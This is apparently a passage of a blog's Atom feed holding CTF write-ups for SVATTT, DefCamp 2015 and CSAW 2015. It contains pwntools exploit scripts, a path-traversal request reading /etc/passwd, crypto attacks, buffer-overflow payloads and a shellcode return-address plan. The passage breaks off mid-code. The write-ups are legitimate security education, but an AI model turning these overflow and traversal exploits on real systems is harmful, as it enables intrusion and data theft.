+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from pwn import *
+</span><span class='line'>try:
+</span><span class='line'>    r = remote('119.15.167.212', 31338)    
+</span><span class='line'>    print r.recvuntil(':')
+</span><span class='line'>    r.send('\x00' * 128)
+</span><span class='line'>    print r.recvuntil('&gt; ')
+</span><span class='line'>    r.send('/home/exp100/flag.txt')
+</span><span class='line'>    print r.recv(1000)
+</span><span class='line'>except Exception, e:
+</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>We have flag: <code>SVATTT_has_just_begun</code></p>
+
+<p>Hôm nay viết bài, mình mới thấy cái hint, và cũng không rõ cái hint đó có ý nghĩa gì :/</p>
+
+<h2>Exploit 100 - Hải Phòng :: Weird HTTP</h2>
+
+<pre><code>Weird HTTP
+I really love C &lt;3.
+One byte to rule them all.
+http://119.15.167.212:31335/index.html
+</code></pre>
+
+<p>Nói đến bài này, thì phải bắt đầu từ lúc đồng đội mình gửi cho mình cách <code>nc 119.15.167.212 31335</code> (IP và địa chỉ của kì thi lúc đó có thể sẽ khác), sau đó chèn thêm đoạn payload <code>GET /index.php HTTP/1.1</code> có kết quả.</p>
+
+<p>Mình thử thay bằng <code>GET //etc/passwd HTTP/1.1</code> thì có thêm vài thông tin thú vị.</p>
+
+<p>Mình thay tiếp thành <code>GET //home/exp100-python/flag HTTP/1.1</code> thì có flag :o</p>
+
+<blockquote><p>Awesome&hellip; (.______.&ldquo;)</p></blockquote>
+
+<p>Dưới đây là code pwn của mình :v (vì đây là bài pwn mà :( )</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from pwn import *
+</span><span class='line'>
+</span><span class='line'>try:    
+</span><span class='line'>    r = remote('119.15.167.212', 31335)    
+</span><span class='line'>    code = 'GET //home/exp100-python/flag' + ' HTTP/1.1'    
+</span><span class='line'>    r.send(code)
+</span><span class='line'>    print r.recv()    
+</span><span class='line'>    print r.recv()        
+</span><span class='line'>except Exception, e:
+</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Flag: <code>SVATTT_u_got_easter_egg</code></p>
+
+<blockquote><p>Have fun and Happy hacking</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DefCamp CTF 2015 - Writeup]]></title>
+    <link href="http://tungpun.github.io/blog/2015/10/07/dctf-writeup/"/>
+    <updated>2015-10-07T07:56:05+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/10/07/dctf-writeup</id>
+    <content type="html"><![CDATA[<p>Last week, Online Qualification of <a href="http://dctf.def.camp/">DefCamp</a> or <a href="http://dctf.def.camp/">DCTF</a> was opened.
+Our team don&rsquo;t have chance to join The Final, however, there are some interesting things (with me at least) to share in this post.</p>
+
+<h2>Crypto 50</h2>
+
+<p>They give us a text file with content:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>f363844fd41932070e24df7f6c2397b4f0ee4bc567c32e6f8be4665116657ff880756558fe63f47975fa94e8fa1efc6e97cf9c99931ce21d7b03ef4f61bdc6f74fc566cac6f0fe7b939237d3ab9e37adf9910cfc899ed3ff7b79ead95b8aced21ec1079c72409e878425fd61026fbf1e9319ff6dc4c75c356f04ffe204ce480c488ff34eb78034aa23d87309
+</span><span class='line'>d12a9b49d446354e0020912f6f2297b7eaee4f8062c32479d2f66253016b6ab182723152ff69a46178ebd1e5e04ae760978b9c929319ab0a6018b70a5bf5d6b946d27ad8d9e3f9769b923dc9fb953db2b7d816f1889ecbf86a3cbec45e8aced213c44ebd5275cad3d72ef9631f72a15b8f57f123cac412742e03b6fb098b1c350d9bf25db78023ab3690751276f46d9e598a1f0b
+</span><span class='line'>c4629107da0e38541937d43e6366dab7eaff1cc266c32879c5e06440106f63b18e7b7c41fc61a06871e694e8ed4ae760978b9c92930aab19614cf85e2ff1d6f85ec323dfc5f4bc6497df319ab7933cb8a1d958f59f9ec8f97b74eedc578680d61add53f3477ed687942bfe6a1972f2198519e170ced412786105bab618c309340d92f34cbf
+</span><span class='line'>c4629d549106204c0836912b662397b1e0f848c56ec33979d9fc3642116765f49f677e5cf524a0623df6d9f9f50ff864979bd396dd5db21f680fed436cf89fb94cd9678bcce2bc76d6c031c9ae9a26ffa1d91db483d0d9bc6a3df3d5169f8fc65fcd46a0067eddd3d728f5611826a512845cf87a8bc541706a5bfff314c80d2a59ddfb40a88023ab36907b1475e8288f5f86131689d8606623e1629bca36e38a53608b88
+</span><span class='line'>d12a8753c30e204a4d26d82f6623c5e2f4ea57c570c33a6fcea57947446b27fc98777911e369b56171fac6a9f804f1219480819a931ead037f09f7436af3c7b946d27a8bdee4ff7fd6d3279aeac46affb7d80ce7c29efef06d31fa905981ced617cc54f34d75cb8bd723e4241163bc1e9258e066d89053357e04bae308c41a3b4399f242facb32ba20c4641e67f1
+</span><span class='line'>d12a8753c30e204a4d26d82f6623c5e2feee52c571823b79d8a56554076962e29e7d6754b061b86870fadafdea4afa67d99b9b9a9316a7147a18eb4f6ef093fb4cc466cf8dfef23797dc74d3b58237adbbd014b49fcadde57b
+</span><span class='line'>d964d446911838490e2dc3306029c2b1b9f848d26682223cc8ec6649017827f0cd676543f565b92d72f994f9ea0fe06596c2819edd19ad002908f04d66e9c0b944c423ccc8fff96597c631defb9f3cbbb0c11dfa88dbd2e5722dbedf50cf9aca1a8557bf4779dcd39232e4241768b65b8350e46bcec246707603fffb09d81b3b4a98ee03fac139a773c47e1e68bc6b83408d0e118fdd2c312be57ad7d73de7de4a638492956d6ecc9d
+</span><span class='line'>d96cd807d90436421b20c3732e2797a6f0ec55d4238a3c3cc8ea6453117a73f48934785fb070a66c73ecd9e0ea19fc6e97c3d38dd209aa087b4ced426ef393f849d366cf8dfeee379add27cef7d63db1b9c858f5cccdd5ff7938fb90528689cb0b854ebd0664dac2d73afc651f68a61e984db46ad89053736812bce209cf483b4399bd5bb2c577a621c2790926f867895ecf09109e997c342de17390c221e7de4e60c5948f716ec6c9c6322151f9dbb8fe9f411876eb04576524f3f4d6
+</span><span class='line'>d1649b53d90e33070c35c12d6127d4aab9fe4fc570c33c79dde06440082a68f7cd607954b074a6686bf6dbfcea4adb219a868397d60fb6087118b94e66fadaed5e9777c48df2f37a86c720dffb823abaf5da1ded9fcacef47f39b090659a8dca5fd644bb437dd7d4d72be261566dbc149757b462d89041706211f2e515c50b325f92f346a0c939a473c3620963fd65cc4e8617178fcb7f
+</span><span class='line'>d2639a46c31261541937d43e6366d4abe9e359d270c32e6ecea57947106f69b18e7b7f42e476a16e69fad0a9ec19fc6f9ecf9f96dd18a31f290afc4f6bffd2fa469770c3c4f7e83784d733d3a88237ada6911af18fdfc9e27b74ead85396cec11ecb07b14330d7c68423fc7d566fbf0b8c5cf966c5c457712e1eb1b604ca1a3e5a9cef4afac139a773d3771526fe6dcc5f8a061b83d5756623ff739bda26e79a1a62848f937c66d59ddf303249e682
+</span><span class='line'>c7629149911e324e0322913e2e35c3b0fcea5180608a3f74cef73a010a6f71f49f346442f524a06578bfdfece04af86e8b8ad38bdb1cac4d6602fa4f2e</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>And a hint is about xor time one time (I can&rsquo;t view exactly problem now).
+Too clear, we will use a technique called <strong>Many Time Pad</strong>.</p>
+
+<p>My old piece of code was useful:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import re
+</span><span class='line'>
+</span><span class='line'>def bstrxor(a, b):     # xor two strings of different lengths
+</span><span class='line'>    if len(a) &gt; len(b):
+</span><span class='line'>        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
+</span><span class='line'>    else:
+</span><span class='line'>        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])
+</span><span class='line'>
+</span><span class='line'>GUESSWORD = 'The'
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    f = open('input.txt', 'r')
+</span><span class='line'>    clines = f.readlines()
+</span><span class='line'>    f.close()
+</span><span class='line'>
+</span><span class='line'>    n = len(clines)
+</span><span class='line'>
+</span><span class='line'>    for i in range(n):
+</span><span class='line'>        for j in range(n):
+</span><span class='line'>            if (i != j):
+</span><span class='line'>                x = clines[i][:-1].decode('hex')
+</span><span class='line'>                y = clines[j][:-1].decode('hex')
+</span><span class='line'>                pair = bstrxor(x, y)
+</span><span class='line'>                print i, j, '\t', bstrxor(pair, GUESSWORD)
+</span><span class='line'>        print ''</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<h2>Crypto 200</h2>
+
+<p>Lucky me, keep the question:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>The folowing plaintext has been encrypted using an unknown key, with AES-128 CBC:
+</span><span class='line'>Original: Pass: sup3r31337. Don't loose it!
+</span><span class='line'>Encrypted: 4f3a0e1791e8c8e5fefe93f50df4d8061fee884bcc5ea90503b6ac1422bda2b2b7e6a975bfc555f44f7dbcc30aa1fd5e
+</span><span class='line'>IV: 19a9d10c3b155b55982a54439cb05dce
+</span><span class='line'>    31396139643130633362313534343466393c3563353534333c61663130626365
+</span><span class='line'>
+</span><span class='line'>How would you modify it so that it now decrypts to: "Pass: notAs3cre7. Don't loose it!" </span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>First through in my mind is &ldquo;Bit flipping&rdquo; cuz, I think <strong>it</strong> in <strong>mofify it</strong> is ciphertext <code>4f3a0e1791e8c8e5fefe93f50df4d8061fee884bcc5ea90503b6ac1422bda2b2b7e6a975bfc555f44f7dbcc30aa1fd5e</code>.
+But the block what we need modify is the first one.</p>
+
+<blockquote><p>One hour</p>
+
+<p>Two hour</p>
+
+<p>Three hour</p>
+
+<p>&hellip;</p></blockquote>
+
+<p>Look at the <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">CBC Mode</a> graph with concentration, we suddenly recognize that the <strong>it</strong> could be <code>IV</code> too. If that happended, the solution will be much easier.</p>
+
+<p>Here&rsquo;s my answer:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>def bstrxor(a, b):     # xor two strings of different lengths
+</span><span class='line'>    if len(a) &gt; len(b):
+</span><span class='line'>        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
+</span><span class='line'>    else:
+</span><span class='line'>        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    #old_iv = "\x19\xa9\xd1\x0c\x3b\x15\x5b\x55\x98\x2a\x54\x43\x9c\xb0\x5d\xce"    
+</span><span class='line'>    old_iv = "19a9d10c3b155b55982a54439cb05dce"
+</span><span class='line'>    print len(old_iv)
+</span><span class='line'>    old_p = "Pass: sup3r31337. Don't loose it!"
+</span><span class='line'>    old_b = "Pass: sup3r31337"
+</span><span class='line'>    static = bstrxor(old_b, old_iv.decode('hex'))
+</span><span class='line'>    print static.encode('hex')
+</span><span class='line'>    print len(static), len(old_b), len(old_iv.decode('hex'))
+</span><span class='line'>
+</span><span class='line'>    new_b = "Pass: notAs3cre7"
+</span><span class='line'>    new_iv = bstrxor(new_b, static)
+</span><span class='line'>    print new_iv.encode('hex')</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<h2>Crypto 300</h2>
+
+<p>My teamate solved this challenge with graph algorthm (DFS) and brute-forcing last bit technique.
+However, i haven&rsquo;t ever received detail solution from him, so, it is the only thing i know.</p>
+
+<h2>Pwn 100</h2>
+
+<p>It&rsquo;s a simple Buffer over flow.
+Everything we need is overwrite the xorkey to <code>0xBADB0169</code>
+Calculate the space in stack, i have:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>## compose_payload.py
+</span><span class='line'>#!/usr/bin/python2.7
+</span><span class='line'>from pwn import *
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    junk = "A" * 52
+</span><span class='line'>    val = 0xBADB0169
+</span><span class='line'>    payload = junk + p32(val)
+</span><span class='line'>    f = open("input.0x", "w")
+</span><span class='line'>    f.write(payload)
+</span><span class='line'>    f.close()</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>The hardest work in this challenge must be find out the way to vpn to the server :))
+Then, push the payload to program, we have flag.</p>
+
+<h2>Misc 200</h2>
+
+<p>My teamate give me the web page which contains this text:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>43 61 70 74 75 72 65 20 74 68 65 09 46 6C 61 67 20 28 43 54 46 29 09 69 73 20 61 20 73 70 65 63 69 61 6C 09 6B 69 6E 64 09 6F 66 20 69 6E 66 6F 72 6D 61 74 69 6F 6E 09 73 65 63 75 72 69 74 79 09 63 6F 6D 70 65 74 69 74 69 6F 6E 73 2E 20 54 68 65 72 65 20 61 72 65 09 74 68 72 65 65 20 63 6F 6D 6D 6F 6E 09 74 79 70 65 73 20 6F 66 09 43 54 46 73 3A 09 4A 65 6F 70 61 72 64 79 2C 20 41 74 74 61 63 6B 2D 44 65 66 65 6E 63 65 20 61 6E 64 20 6D 69 78 65 64 2E 09 0D 0A 4A 65 6F 70 61 72 64 79 2D 73 74 79 6C 65 09 43 54 46 73 20 68 61 73 09 61 09 63 6F 75 70 6C 65 20 6F 66 09 71 75 65 73 74 69 6F 6E 73 09 28 74 61 73 6B 73 29 09 69 6E 09 72 61 6E 67 65 20 6F 66 09 63 61 74 65 67 6F 72 69 65 73 2E 09 46 6F 72 20 65 78 61 6D 70 6C 65 2C 09 57 65 62 2C 09 46 6F 72 65 6E 73 69 63 2C 09 43 72 79 70 74 6F 2C 20 42 69 6E 61 72 79 20 6F 72 09 73 6F 6D 65 74 68 69 6E 67 09 65 6C 73 65 2E 20 54 65 61 6D 20 63 61 6E 09 67 61 69 6E 20 73 6F 6D 65 20 70 6F 69 6E 74 73 20 66 6F 72 20 65 76 65 72 79 09 73 6F 6C 76 65 64 20 74 61 73 6B 2E 20 4D 6F 72 65 20 70 6F 69 6E 74 73 20 66 6F 72 20 6D 6F 72 65 20 63 6F 6D 70 6C 69 63 61 74 65 64 09 74 61 73 6B 73 09 75 73 75 61 6C 6C 79 2E 09 54 68 65 20 6E 65 78 74 20 74 61 73 6B 20 69 6E 20 63 68 61 69 6E 20 63 61 6E 09 62 65 09 6F 70 65 6E 65 64 20 6F 6E 6C 79 20 61 66 74 65 72 20 73 6F 6D 65 20 74 65 61 6D 09 73 6F 6C 76 65 20 70 72 65 76 69 6F 75 73 09 74 61 73 6B 2E 09 54 68 65 6E 09 74 68 65 20 67 61 6D 65 20 74 69 6D 65 09 69 73 20 6F 76 65 72 20 73 75 6D 09 6F 66 09 70 6F 69 6E 74 73 09 73 68 6F 77 73 20 79 6F 75 09 61 20 43 54 46 20 77 69 6E 65 72 2E 20 46 61 6D 6F 75 73 20 65 78 61 6D 70 6C 65 09 6F 66 20 73 75 63 68 20 43 54 46 20 69 73 20 44 65 66 63 6F 6E 20 43 54 46 20 71 75 61 6C 73 2E 09 0D 0A 57 65 6C 6C 2C 09 61 74 74 61 63 6B 2D 64 65 66 65 6E 63 65 20 69 73 09 61 6E 6F 74 68 65 72 20 69 6E 74 65 72 65 73 74 69 6E 67 20 6B 69 6E 64 09 6F 66 20 63 6F 6D 70 65 74 69 74 69 6F 6E 73 2E 09 48 65 72 65 09 65 76 65 72 79 20 74 65 61 6D 09 68 61 73 09 6F 77 6E 09 6E 65 74 77 6F 72 6B 28 6F 72 20 6F 6E 6C 79 20 6F 6E 65 20 68 6F 73 74 29 09 77 69 74 68 20 76 75 6C 6E 61 72 61 62 6C 65 20 73 65 72 76 69 63 65 73 2E 20 59 6F 75 72 20 74 65 61 6D 20 68 61 73 20 74 69 6D 65 09 66 6F 72 09 70 61 74 63 68 69 6E 67 20 79 6F 75 72 09 73 65 72 76 69 63 65 73 09 61 6E 64 20 64 65 76 65 6C 6F 70 69 6E 67 20 65 78 70 6C 6F 69 74 73 20 75 73 75 61 6C 6C 79 2E 09 53 6F 2C 09 74 68 65 6E 20 6F 72 67 61 6E 69 7A 65 72 73 09 63 6F 6E 6E 65 63 74 73 20 70 61 72 74 69 63 69 70 61 6E 74 73 20 6F 66 09 63 6F 6D 70 65 74 69 74 69 6F 6E 20 61 6E 64 09 74 68 65 09 77 61 72 67 61 6D 65 09 73 74 61 72 74 73 21 20 59 6F 75 20 73 68 6F 75 6C 64 09 70 72 6F 74 65 63 74 09 6F 77 6E 20 72 65 64 09 68 65 72 72 69 6E 67 09 66 6F 72 20 64 65 66 65 6E 63 65 20 70 6F 69 6E 74 73 20 61 6E 64 09 68 61 63 6B 09 6F 70 70 6F 6E 65 6E 74 73 20 66 6F 72 20 61 74 74 61 63 6B 09 70 6F 69 6E 74 73 2E 09 48 69 73 74 6F 72 69 63 61 6C 6C 79 20 74 68 69 73 20 69 73 20 61 20 66 69 72 73 74 20 74 79 70 65 20 6F 66 09 43 54 46 73 2C 09 65 76 65 72 79 62 6F 64 79 20 6B 6E 6F 77 73 20 61 62 6F 75 74 20 44 45 46 20 43 4F 4E 20 43 54 46 20 2D 09 73 6F 6D 65 74 68 69 6E 67 09 6C 69 6B 65 20 61 20 57 6F 72 6C 64 20 43 75 70 20 6F 66 20 61 6C 6C 09 6F 74 68 65 72 09 63 6F 6D 70 65 74 69 74 69 6F 6E 73 2E 09 0D 0A 4D 69 78 65 64 20 63 6F 6D 70 65 74 69 74 69 6F 6E 73 20 6D 61 79 20 76 61 72 79 20 70 6F 73 73 69 62 6C 65 20 66 6F 72 6D 61 74 73 2E 09 49 74 09 6D 61 79 20 62 65 20 73 6F 6D 65 74 68 69 6E 67 20 6C 69 6B 65 20 77 61 72 67 61 6D 65 09 77 69 74 68 20 73 70 65 63 69 61 6C 09 74 69 6D 65 09 66 6F 72 09 74 61 73 6B 2D 62 61 73 65 64 20 65 6C 65 6D 65 6E 74 73 20 28 6C 69 6B 65 09 55 43 53 42 20 69 43 54 46 29 2E 20 0D 0A 43 54 46 09 67 61 6D 65 73 09 6F 66 74 65 6E 09 74 6F 75 63 68 20 6F 6E 09 6D 61 6E 79 20 6F 74 68 65 72 20 61 73 70 65 63 74 73 20 6F 66 20 69 6E 66 6F 72 6D 61 74 69 6F 6E 09 73 65 63 75 72 69 74 79 3A 09 63 72 79 70 74 6F 67 72 61 70 68 79 2C 20 73 74 65 67 6F 2C 20 62 69 6E 61 72 79 09 61 6E 61 6C 79 73 69 73 2C 20 72 65 76 65 72 73 65 20 65 6E 67 65 6E 65 65 72 69 6E 67 2C 20 6D 6F 62 69 6C 65 09 73 65 63 75 72 69 74 79 20 61 6E 64 09 6F 74 68 65 72 73 2E 09 47 6F 6F 64 09 74 65 61 6D 73 20 67 65 6E 65 72 61 6C 6C 79 20 68 61 76 65 09 73 74 72 6F 6E 67 09 73 6B 69 6C 6C 73 09 61 6E 64 20 65 78 70 65 72 69 65 6E 63 65 20 69 6E 09 61 6C 6C 20 74 68 65 73 65 20 69 73 73 75 65 73 2E 09 0D 0A 41 6C 6C 09 72 69 67 68 74 73 20 72 65 73 65 72 76 65 64 09 74 6F 20 63 74 66 74 69 6D 65 2E 6F 72 67 20 0D 0A 45 6E 6A 6F 79 09 74 68 69 73 20 43 54 46 09 61 6E 64 09 67 65 74 09 69 6E 20 74 68 65 20 66 69 6E 61 6C 20 72 6F 75 6E 64 21
+</span><span class='line'>
+</span><span class='line'>Capture the.Flag (CTF).is a special.kind.of information.security.competitions. There are.three common.types of.CTFs:.Jeopardy, Attack-Defence and mixed....Jeopardy-style.CTFs has.a.couple of.questions.(tasks).in.range of.categories..For example,.Web,.Forensic,.Crypto, Binary or.something.else. Team can.gain some points for every.solved task. More points for more complicated.tasks.usually..The next task in chain can.be.opened only after some team.solve previous.task..Then.the game time.is over sum.of.points.shows you.a CTF winer. Famous example.of such CTF is Defcon CTF quals....Well,.attack-defence is.another interesting kind.of competitions..Here.every team.has.own.network(or only one host).with vulnarable services. Your team has time.for.patching your.services.and developing exploits usually..So,.then organizers.connects participants of.competition and.the.wargame.starts! You should.protect.own red.herring.for defence points and.hack.opponents for attack.points..Historically this is a first type of.CTFs,.everybody knows about DEF CON CTF -.something.like a World Cup of all.other.competitions....Mixed competitions may vary possible formats..It.may be something like wargame.with special.time.for.task-based elements (like.UCSB iCTF). ..CTF.games.often.touch on.many other aspects of information.security:.cryptography, stego, binary.analysis, reverse engeneering, mobile.security and.others..Good.teams generally have.strong.skills.and experience in.all these issues....All.rights reserved.to ctftime.org ..Enjoy.this CTF.and.get.in the final round!</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>I give care to the space between words: sometime they are <code>\x20</code>, something not. It may be binary&rsquo;s sign.</p>
+
+<p>I read from first character to last, if it&rsquo;s pure space character <code>\x20</code>, i got <code>0</code> and <code>1</code> in otherwise.
+Convert the result to ascii, i have the name to download next file.</p>
+
+<p>The remaining part is belong to my friends.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Writeup | CSAW CTF 2015 - Pwn - Precision]]></title>
+    <link href="http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision/"/>
+    <updated>2015-09-22T22:18:44+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision</id>
+    <content type="html"><![CDATA[<pre><code>nc 54.210.15.77 1259
+Updated again!
+</code></pre>
+
+<p><a href="https://ctf.isis.poly.edu/static/uploads/42bf99ba903b051923e707ba422f068a/precision_a8f6f0590c177948fe06c76a1831e650">precision_a8f6f0590c177948fe06c76a1831e650</a></p>
+
+<p>Download binary file, open with IDA and HexRay, i have:</p>
+
+<p><img src="http://i.imgur.com/9J3MUqz.jpg" alt="IDA" /></p>
+
+<p>Program prompts user to input a string, then saved to v4.
+Seem like there is a buffer over flow here.
+So, we should fill the junk data to the string then overwrite return address to execute shellcode.</p>
+
+<p>Check security, using <code>checksec</code> in <code>gdb-peda</code>:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb precision
+</span><span class='line'>Reading symbols from precision...(no debugging symbols found)...done.
+</span><span class='line'>gdb-peda$ checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : disabled
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : Partial
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Nice.</p>
+
+<p>Have a look at the below code again, we can calculate the length of string (0x80 or 128)</p>
+
+<p>However, we have other issue. The program uses v5 to verify and avoid overflowing the buffer.
+I use gdb-peda to view stack, find out the value which is used to verify.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/80xw $sp
+</span><span class='line'>0xffffd5c0:     0x08048682      0xffffd5d8      0x00000002      0x00000000
+</span><span class='line'>0xffffd5d0:     0xffffd60e      0x00000001      0x41414141      0x41414141
+</span><span class='line'>0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5f0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd620:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd630:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd640:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd650:     0x41414141      0x41414141      0x475a3100      0x40501555
+</span><span class='line'>0xffffd660:     0x00000000      0xf7fc8000      0x00000000      0xf7e29497  &lt;- [return address]
+</span><span class='line'>0xffffd670:     0x00000001      0xffffd704      0xffffd70c      0x00000000
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>I use the following 24 bytes to append 128 junk bytes of payload
+<code>0x475a31a5      0x40501555    0x00000000      0xf7fc8000      0x00000000     [new-return-address]</code></p>
+
+<p>What is &lsquo;new-return-address&rsquo; ?
+Do you remember the gift, which program give us everytime we try to run the binary ? It is address of first byte of payload. So, we can put our shellcode there, and put that address to <code>new-return-address</code></p>
+
+<p>Just some pieces of code more:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
